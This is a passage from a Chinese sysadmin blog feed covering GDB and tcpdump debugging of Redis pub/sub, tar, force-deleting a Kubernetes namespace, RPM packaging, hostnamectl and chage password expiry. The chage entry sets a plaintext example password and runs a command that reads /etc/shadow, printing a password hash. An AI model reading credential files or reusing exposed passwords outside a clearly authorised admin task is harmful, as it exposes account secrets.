<h3><span id="调试方法参考">调试方法参考</span></h3><h4><span id="1-频道订阅场景用gdb打印字典pubsub_channels-的方法参考如下">1、频道订阅场景，用GDB打印字典<code>pubsub_channels</code> 的方法参考如下：<span id="jumpx"></span></span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、打印pubsub_channels字典</span></span><br><span class="line">(gdb) p *(server.pubsub_channels)</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  type = <span class="number">0x557a48da1160</span> &lt;keylistDictType&gt;,</span><br><span class="line">  privdata = <span class="number">0x0</span>,</span><br><span class="line">  ht = &#123;&#123;</span><br><span class="line">      table = <span class="number">0x7f4f0bc0e3a0</span>,</span><br><span class="line">      size = <span class="number">4</span>,</span><br><span class="line">      sizemask = <span class="number">3</span>,</span><br><span class="line">      used = <span class="number">2</span>				<span class="comment">// channel频道总数为2</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      table = <span class="number">0x0</span>,</span><br><span class="line">      size = <span class="number">0</span>,</span><br><span class="line">      sizemask = <span class="number">0</span>,</span><br><span class="line">      used = <span class="number">0</span></span><br><span class="line">    &#125;&#125;,</span><br><span class="line">  rehashidx = <span class="number">-1</span>,</span><br><span class="line">  iterators = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">0</span>]</span><br><span class="line">$<span class="number">2</span> = (dictEntry *) <span class="number">0x0</span></span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>]</span><br><span class="line">$<span class="number">3</span> = (dictEntry *) <span class="number">0x7f4f0bc4b728</span></span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">2</span>]</span><br><span class="line">$<span class="number">4</span> = (dictEntry *) <span class="number">0x7f4f0bc4b7d0</span></span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">3</span>]</span><br><span class="line">$<span class="number">5</span> = (dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.1 打印所有的channel，此例中channel个数为2，分别是channel1, channel2</span></span><br><span class="line">(gdb) p (<span class="type">char</span> *)((robj *)(server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>].key)).ptr</span><br><span class="line">$<span class="number">6</span> = <span class="number">0x7f4f0bc0e373</span> <span class="string">&quot;channel1&quot;</span></span><br><span class="line">(gdb) p (<span class="type">char</span> *)((robj *)(server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">2</span>].key)).ptr</span><br><span class="line">$<span class="number">7</span> = <span class="number">0x7f4f0bc0e433</span> <span class="string">&quot;channel2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、打印每个channel对应的客户端链表</span></span><br><span class="line">(gdb) p (<span class="built_in">list</span> *)server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>].v.val</span><br><span class="line">$<span class="number">8</span> = (<span class="built_in">list</span> *) <span class="number">0x7f4f0bc0fa20</span></span><br><span class="line"><span class="comment">// 2.1 链表长度为2，表示有2个客户端正在订阅channel1频道</span></span><br><span class="line">(gdb) p *(<span class="built_in">list</span> *)server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>].v.val</span><br><span class="line">$<span class="number">9</span> = &#123;</span><br><span class="line">  head = <span class="number">0x7f4f0bc4b740</span>,</span><br><span class="line">  tail = <span class="number">0x7f4f0bc4b7a0</span>,</span><br><span class="line">  dup = <span class="number">0x0</span>,</span><br><span class="line">  <span class="built_in">free</span> = <span class="number">0x0</span>,</span><br><span class="line">  match = <span class="number">0x0</span>,</span><br><span class="line">  len = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 链表长度为2，表示有2个客户端正在订阅channel2频道</span></span><br><span class="line">(gdb) p *(<span class="built_in">list</span> *)server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">2</span>].v.val</span><br><span class="line">$<span class="number">10</span> = &#123;</span><br><span class="line">  head = <span class="number">0x7f4f0bc4b7e8</span>,</span><br><span class="line">  tail = <span class="number">0x7f4f0bc4b830</span>,</span><br><span class="line">  dup = <span class="number">0x0</span>,</span><br><span class="line">  <span class="built_in">free</span> = <span class="number">0x0</span>,</span><br><span class="line">  match = <span class="number">0x0</span>,</span><br><span class="line">  len = <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="2-模式订阅场景用gdb打印模式链表pubsub_patterns和模式字典pubsub_patterns_dict的方法参考如下">2、模式订阅场景，用GDB打印模式链表<code>pubsub_patterns</code>和模式字典<code>pubsub_patterns_dict</code>的方法参考如下： <span id="jumpy"></span></span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打印模式链表pubsub_patterns</span></span><br><span class="line">p *(server.pubsub_patterns)</span><br><span class="line">$<span class="number">3</span> = &#123;head = <span class="number">0x7f499144b740</span>, tail = <span class="number">0x7f499144b7d0</span>, dup = <span class="number">0x0</span>, <span class="built_in">free</span> = <span class="number">0x55c68a57c110</span> &lt;freePubsubPattern&gt;,</span><br><span class="line">  match = <span class="number">0x55c68a57c130</span> &lt;listMatchPubsubPattern&gt;, len = <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链表长度为4</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">12</span> = (sds) <span class="number">0x7f499140e353</span> <span class="string">&quot;pat1*&quot;</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;next-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">13</span> = (sds) <span class="number">0x7f499140e3b3</span> <span class="string">&quot;pat2*&quot;</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;next-&gt;next-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">14</span> = (sds) <span class="number">0x7f499140e3d3</span> <span class="string">&quot;pat3*&quot;</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;next-&gt;next-&gt;next-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">15</span> = (sds) <span class="number">0x7f499140e413</span> <span class="string">&quot;pat3*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印模式字典</span></span><br><span class="line">(gdb) p *server.pubsub_patterns_dict</span><br><span class="line">$<span class="number">16</span> = &#123;type = <span class="number">0x55c68a6ce160</span> &lt;keylistDictType&gt;, privdata = <span class="number">0x0</span>, ht = &#123;&#123;table = <span class="number">0x7f499140e380</span>, size = <span class="number">4</span>, sizemask = <span class="number">3</span>,</span><br><span class="line">      used = <span class="number">3</span>&#125;, &#123;table = <span class="number">0x0</span>, size = <span class="number">0</span>, sizemask = <span class="number">0</span>, used = <span class="number">0</span>&#125;&#125;, rehashidx = <span class="number">-1</span>, iterators = <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字典有3个key</span></span><br><span class="line">p (sds)((robj *)server.pubsub_patterns_dict-&gt;ht[<span class="number">0</span>].table[<span class="number">1</span>]-&gt;key)-&gt;ptr</span><br><span class="line">$<span class="number">27</span> = (sds) <span class="number">0x7f499140e353</span> <span class="string">&quot;pat1*&quot;</span></span><br><span class="line">(gdb) p (sds)((robj *)server.pubsub_patterns_dict-&gt;ht[<span class="number">0</span>].table[<span class="number">3</span>]-&gt;key)-&gt;ptr</span><br><span class="line">$<span class="number">28</span> = (sds) <span class="number">0x7f499140e3d3</span> <span class="string">&quot;pat3*&quot;</span></span><br><span class="line">(gdb) p (sds)((robj *)server.pubsub_patterns_dict-&gt;ht[<span class="number">0</span>].table[<span class="number">3</span>]-&gt;next-&gt;key)-&gt;ptr</span><br><span class="line">$<span class="number">29</span> = (sds) <span class="number">0x7f499140e3b3</span> <span class="string">&quot;pat2*&quot;</span></span><br></pre></td></tr></table></figure>

<h4><span id="3-通过tcpdump抓包分析一次订阅中的连接建立-请求消息的过程">3、通过tcpdump抓包，分析一次订阅中的连接建立、请求消息的过程 <span id="jumpz"></span></span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tcpdump tcp port 6379 -X -i lo</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">三次握手</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SYN</span></span><br><span class="line">15:36:47.497450 IP localhost.50208 &gt; localhost.6379: Flags [S], seq 3233936820, win 65495, options [mss 65495,sackOK,TS val 3705662768 ecr 0,nop,wscale 7], length 0</span><br><span class="line">        0x0000:  4500 003c 84bd 4000 4006 b7fc 7f00 0001  E..&lt;..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5b4 0000 0000  ................</span><br><span class="line">        0x0020:  a002 ffd7 fe30 0000 0204 ffd7 0402 080a  .....0..........</span><br><span class="line">        0x0030:  dcdf ed30 0000 0000 0103 0307            ...0........</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SYN + ACK</span></span><br><span class="line">15:36:47.497456 IP localhost.6379 &gt; localhost.50208: Flags [S.], seq 4118461797, ack 3233936821, win 65483, options [mss 65495,sackOK,TS val 3705662768 ecr 3705662768,nop,wscale 7], length 0</span><br><span class="line">        0x0000:  4500 003c 0000 4000 4006 3cba 7f00 0001  E..&lt;..@.@.&lt;.....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd65 c0c1 f5b5  .........z.e....</span><br><span class="line">        0x0020:  a012 ffcb fe30 0000 0204 ffd7 0402 080a  .....0..........</span><br><span class="line">        0x0030:  dcdf ed30 dcdf ed30 0103 0307            ...0...0....</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ACK</span></span><br><span class="line">15:36:47.497462 IP localhost.50208 &gt; localhost.6379: Flags [.], ack 1, win 512, options [nop,nop,TS val 3705662768 ecr 3705662768], length 0</span><br><span class="line">        0x0000:  4500 0034 84be 4000 4006 b803 7f00 0001  E..4..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5b5 f57a bd66  .............z.f</span><br><span class="line">        0x0020:  8010 0200 fe28 0000 0101 080a dcdf ed30  .....(.........0</span><br><span class="line">        0x0030:  dcdf ed30                                ...0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">三次握手结束，订阅的长连接建立</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端发送请求：<span class="string">&quot;subscribe channel1&quot;</span>，采用RESP协议</span></span><br><span class="line">15:36:47.498719 IP localhost.50208 &gt; localhost.6379: Flags [P.], seq 1:34, ack 1, win 512, options [nop,nop,TS val 3705662770 ecr 3705662768], length 33: RESP &quot;subscribe&quot; &quot;channel1&quot;</span><br><span class="line">        0x0000:  4500 0055 84bf 4000 4006 b7e1 7f00 0001  E..U..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5b5 f57a bd66  .............z.f</span><br><span class="line">        0x0020:  8018 0200 fe49 0000 0101 080a dcdf ed32  .....I.........2</span><br><span class="line">        0x0030:  dcdf ed30 2a32 0d0a 2439 0d0a 7375 6273  ...0*2..$9..subs</span><br><span class="line">        0x0040:  6372 6962 650d 0a24 380d 0a63 6861 6e6e  cribe..$8..chann</span><br><span class="line">        0x0050:  656c 310d 0a                             el1..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端的ACK</span></span><br><span class="line">15:36:47.498725 IP localhost.6379 &gt; localhost.50208: Flags [.], ack 34, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 0</span><br><span class="line">        0x0000:  4500 0034 d240 4000 4006 6a81 7f00 0001  E..4.@@.@.j.....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd66 c0c1 f5d6  .........z.f....</span><br><span class="line">        0x0020:  8010 0200 fe28 0000 0101 080a dcdf ed32  .....(.........2</span><br><span class="line">        0x0030:  dcdf ed32                                ...2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端回复请求：<span class="string">&quot;subscribe channel1 1&quot;</span>，采用RESP协议</span></span><br><span class="line">15:36:47.498803 IP localhost.6379 &gt; localhost.50208: Flags [P.], seq 1:38, ack 34, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 37: RESP &quot;subscribe&quot; &quot;channel1&quot; &quot;1&quot;</span><br><span class="line">        0x0000:  4500 0059 d241 4000 4006 6a5b 7f00 0001  E..Y.A@.@.j[....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd66 c0c1 f5d6  .........z.f....</span><br><span class="line">        0x0020:  8018 0200 fe4d 0000 0101 080a dcdf ed32  .....M.........2</span><br><span class="line">        0x0030:  dcdf ed32 2a33 0d0a 2439 0d0a 7375 6273  ...2*3..$9..subs</span><br><span class="line">        0x0040:  6372 6962 650d 0a24 380d 0a63 6861 6e6e  cribe..$8..chann</span><br><span class="line">        0x0050:  656c 310d 0a3a 310d 0a                   el1..:1..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端的ACK</span></span><br><span class="line">15:36:47.499058 IP localhost.50208 &gt; localhost.6379: Flags [.], ack 38, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 0</span><br><span class="line">        0x0000:  4500 0034 84c0 4000 4006 b801 7f00 0001  E..4..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5d6 f57a bd8b  .............z..</span><br><span class="line">        0x0020:  8010 0200 fe28 0000 0101 080a dcdf ed32  .....(.........2</span><br><span class="line">        0x0030:  dcdf ed32</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下省略客户端循环接受频道消息，四次挥手释放连接的过程......</span></span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>【1】《Redis设计与实现》第18章 发布与订阅 —— 黄健宏</p>
<p>【2】<a href="https://www.cnblogs.com/yougewe/p/12349899.html">Redis（十）：pub&#x2F;sub 发布订阅源码解析</a></p>
<p>【3】<a href="https://blog.huangz.me/diary/2013/redis-pubsub-glob-pattern-example.html">Redis 发布与订阅模式匹配符示例</a></p>
<p>【4】<a href="https://www.runoob.com/redis/redis-pub-sub.html">菜鸟教程 Redis 发布订阅</a></p>
<p>【5】<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>tar打包时去掉目录前缀的方法</title>
    <url>/2022/0604205633.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>tar命令打包时，默认会带上文件路径，举例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tree</span></span><br><span class="line">.</span><br><span class="line">├── dir1</span><br><span class="line">│   └── file1.txt</span><br><span class="line">└── dir2</span><br><span class="line">    ├── dir3</span><br><span class="line">    │   └── file3.txt</span><br><span class="line">    └── file2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar zcf hello.tar.gz ./*</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:20 ./dir1/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir1/file1.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir2/file2.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/dir3/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 ./dir2/dir3/file3.txt</span><br></pre></td></tr></table></figure>
<h2><span id="如果我打包时不想带上文件路径怎么操作">如果我打包时不想带上文件路径，怎么操作？</span></h2><span id="more"></span>

<p>利用-C参数，方法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar -zcf hello.tar.gz -C dir1/ file1.txt -C ../dir2/ file2.txt -C dir3/ file3.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file1.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file2.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 file3.txt</span><br></pre></td></tr></table></figure>

<p>tar用法参考手册：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar --help</span><br><span class="line">Local file selection:</span><br><span class="line">-C, --directory=DIR        change to directory DIR</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>tar</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes删除namespace失败, 陷入Terminating状态解决方法</title>
    <url>/2022/1106205828.html</url>
    <content><![CDATA[<h2><span id="先尝试强制删除deployment和pod等资源">先尝试强制删除deployment和pod等资源</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n $&#123;ns&#125; delete deployment --all --force</span><br><span class="line">kubectl -n $&#123;ns&#125; delete pod --all --force</span><br></pre></td></tr></table></figure>

<h2><span id="如果还是失败通过api强制删除namespace">如果还是失败，通过API强制删除namespace</span></h2><h3><span id="获取需要强制删除的namespace信息">获取需要强制删除的namespace信息</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get ns $&#123;ns&#125; -o json &gt; old_ns.json</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h3><span id="删除finalizers">删除finalizers</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jq &#x27;del(.spec.finalizers)&#x27; old_ns.json &gt; new_ns.json</span><br></pre></td></tr></table></figure>

<h3><span id="运行kube-proxy">运行kube-proxy</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl proxy &amp;</span><br><span class="line">Starting to serve on 127.0.0.1:8001</span><br></pre></td></tr></table></figure>

<h3><span id="通过api强制删除namespace">通过API强制删除namespace</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k -H &quot;Content-Type: application/json&quot; -X PUT --data-binary @new_ns.json http://127.0.0.1:8001/api/v1/namespaces/$&#123;ns&#125;/finalize</span><br></pre></td></tr></table></figure>

<h3><span id="最后关闭kube-proxy-确认namespace被成功删除">最后关闭kube-proxy, 确认namespace被成功删除</span></h3><p>最后给出一个Shell脚本，强制删除Terminating状态的namespace</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量ns表示需要强制删除的namespace</span></span><br><span class="line">kubectl get ns <span class="variable">$&#123;ns&#125;</span> -o json &gt; old_ns.json</span><br><span class="line">jq <span class="string">&#x27;del(.spec.finalizers)&#x27;</span> old_ns.json &gt; new_ns.json</span><br><span class="line"></span><br><span class="line">kubectl proxy &amp;</span><br><span class="line">KUBECTL_PROXY_PID=$!</span><br><span class="line">curl -k -H <span class="string">&quot;Content-Type: application/json&quot;</span> -X PUT --data-binary @new_ns.json http://127.0.0.1:8001/api/v1/namespaces/<span class="variable">$&#123;ns&#125;</span>/finalize</span><br><span class="line"><span class="built_in">kill</span> <span class="variable">$&#123;KUBECTL_PROXY_PID&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查namespace是否陷入Terminating状态</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_if_namespace_is_terminating</span></span>() &#123;</span><br><span class="line">    status=$(kubectl get ns <span class="variable">$&#123;ns&#125;</span> -o json | jq .status.phase -r)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$status</span>&quot;</span> = <span class="string">&quot;Terminating&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">return</span> 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://www.iszy.cc/posts/force-delete-k8s-namespace/">https://www.iszy.cc/posts/force-delete-k8s-namespace/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>RPM打包时指定python自动编译版本为3.X的方法</title>
    <url>/2023/0201210135.html</url>
    <content><![CDATA[<h3><span id="指定python自动编译的版本为python3的方法">指定python自动编译的版本为python3的方法</span></h3><p>在spec文件里添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define  __python /usr/bin/python3</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3><span id="rpm打包时关闭python自动编译的方法">RPM打包时关闭python自动编译的方法</span></h3><p>编辑 <code>/usr/lib/rpm/redhat/macros</code>， 注释掉<code>brp-python-bytecompile</code>一行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%__os_install_post    \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-compress \</span><br><span class="line">    %&#123;!?__debug_package:\</span><br><span class="line">    /usr/lib/rpm/redhat/brp-strip %&#123;__strip&#125; \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-strip-comment-note %&#123;__strip&#125; %&#123;__objdump&#125; \</span><br><span class="line">    &#125; \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-strip-static-archive %&#123;__strip&#125; \</span><br><span class="line">    /usr/lib/rpm/brp-python-bytecompile %&#123;__python&#125; %&#123;?_python_bytecompile_errors_terminate_build&#125; \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-python-hardlink \</span><br><span class="line">    %&#123;!?__jar_repack:/usr/lib/rpm/redhat/brp-java-repack-jars&#125; \</span><br><span class="line">%&#123;nil&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>RPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7中修改hostname的方法</title>
    <url>/2023/0213210415.html</url>
    <content><![CDATA[<h2><span id="hostname临时修改主机名">hostname临时修改主机名</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostname XXX</span><br></pre></td></tr></table></figure>
<h2><span id="hostnamectl永久修改主机名">hostnamectl永久修改主机名</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostnamectl XXX</span><br></pre></td></tr></table></figure>
<p>修改的内容实际是文件<code>/etc/hostname</code></p>
<h2><span id="三种主机名的区别">三种主机名的区别</span></h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man hostnamectl</span><br><span class="line">This tool distinguishes three different hostnames: </span><br><span class="line">the high-level <span class="string">&quot;pretty&quot;</span> hostname <span class="built_in">which</span> might include all kinds of special characters (e.g. <span class="string">&quot;Lennart&#x27;s Laptop&quot;</span>), </span><br><span class="line">the static hostname <span class="built_in">which</span> is used to initialize the kernel hostname at boot (e.g. <span class="string">&quot;lennarts-laptop&quot;</span>), </span><br><span class="line">and the transient hostname <span class="built_in">which</span> is a default received from network configuration. If a static hostname is <span class="built_in">set</span>, and is valid (something other than localhost), <span class="keyword">then</span> the transient hostname is not used.</span><br></pre></td></tr></table></figure>
<h2><span id="centos7中hostnamectl-static命令读取的实际是x2fetcx2fhostname文件的内容">Centos7中，hostnamectl –static命令读取的实际是&#x2F;etc&#x2F;hostname文件的内容</span></h2><p><code>hostnamectl</code>源码参考：<a href="https://github.com/systemd/systemd">https://github.com/systemd/systemd</a><br><code>hostnamectl --static</code>函数调用梳理如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DEFINE_MAIN_FUNCTION(run);</span><br><span class="line">hostnamectl_main func table</span><br><span class="line">get_or_set_hostname</span><br><span class="line">get_hostname_based_on_flag</span><br><span class="line"><span class="title function_">get_one_name</span><span class="params">(bus, <span class="string">&quot;StaticHostname&quot;</span>, <span class="literal">NULL</span>)</span>;</span><br><span class="line">sd_bus_get_property</span><br><span class="line">sd_bus_call_method</span><br><span class="line"><span class="title function_">sd_bus_call_methodv</span><span class="params">()</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> BusObjectImplementation manager_object = &#123;</span><br><span class="line">        <span class="string">&quot;/org/freedesktop/hostname1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.freedesktop.hostname1&quot;</span>,</span><br><span class="line">        .vtables = BUS_VTABLES(hostname_vtable),</span><br><span class="line">&#125;;</span><br><span class="line">hostname_vtable</span><br><span class="line"><span class="title function_">SD_BUS_PROPERTY</span><span class="params">(<span class="string">&quot;StaticHostname&quot;</span>, <span class="string">&quot;s&quot;</span>, property_get_static_hostname, <span class="number">0</span>, SD_BUS_VTABLE_PROPERTY_EMITS_CHANGE)</span></span><br><span class="line">property_get_static_hostname </span><br><span class="line">context_read_etc_hostname</span><br><span class="line">read_etc_hostname</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_etc_hostname</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> **ret)</span> &#123;</span><br><span class="line">        _cleanup_fclose_ FILE *f = <span class="literal">NULL</span>;</span><br><span class="line">        assert(ret);</span><br><span class="line">        <span class="keyword">if</span> (!path)</span><br><span class="line">                path = <span class="string">&quot;/etc/hostname&quot;</span>;</span><br><span class="line">        f = fopen(path, <span class="string">&quot;re&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!f)</span><br><span class="line">                <span class="keyword">return</span> -errno;</span><br><span class="line">        <span class="keyword">return</span> read_etc_hostname_stream(f, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，最终调用<code>read_etc_hostname</code>读取<code>/etc/hostname</code>的内容</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux设置用户密码XX天后失效的方法</title>
    <url>/2023/0213210727.html</url>
    <content><![CDATA[<ol>
<li>新增用户<code>peter</code>并设置密码<code>huawei@123</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd peter</span><br><span class="line">echo peter:huawei@123 | chpasswd</span><br></pre></td></tr></table></figure></li>
<li>使用<code>chage</code>命令设置密码过期时间，这里设置7天后密码过期，过期后立即失效<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chage -m 0 -M 7 -I 0 peter</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
</ol>
<p><code>chage</code>命令用法参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chage -l</span><br><span class="line">  -I, --inactive INACTIVE       set password inactive after expiration</span><br><span class="line">                                to INACTIVE</span><br><span class="line">  -l, --list                    show account aging information</span><br><span class="line">  -m, --mindays MIN_DAYS        set minimum number of days before password</span><br><span class="line">                                change to MIN_DAYS</span><br><span class="line">  -M, --maxdays MAX_DAYS        set maximum number of days before password</span><br><span class="line">                                change to MAX_DAYS</span><br></pre></td></tr></table></figure>
<p>查看信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">chage -l peter</span></span><br><span class="line">Last password change                                    : Feb 13, 2023</span><br><span class="line">Password expires                                        : Feb 20, 2023</span><br><span class="line">Password inactive                                       : Feb 20, 2023</span><br><span class="line">Account expires                                         : never</span><br><span class="line">Minimum number of days between password change          : 0</span><br><span class="line">Maximum number of days between password change          : 7</span><br><span class="line">Number of days of warning before password expires       : 7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/shadow | grep peter</span></span><br><span class="line">peter:$6$XIgc5bJIYhYHSc$Rf0yw7MD2HRPecEwJr9VlshwzBWre6al2lwsfGeB2uVcq1pQaxz2tyvb2r9RtQCSls1sAddjs3BRUCN8IF8fR.:19401:0:7:7:0::</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware Esxi Access to resource settings on the host is restricted to the server...解决方法</title>
    <url>/2023/0213210542.html</url>
    <content><![CDATA[<h2><span id="解决方法">解决方法</span></h2><ol>
<li>先enable ESXI主机的SSH连接，参考：<a href="https://www.uccollabing.com/2016/05/12/enable-ssh-on-vsphere-esxi/">https://www.uccollabing.com/2016/05/12/enable-ssh-on-vsphere-esxi/</a></li>
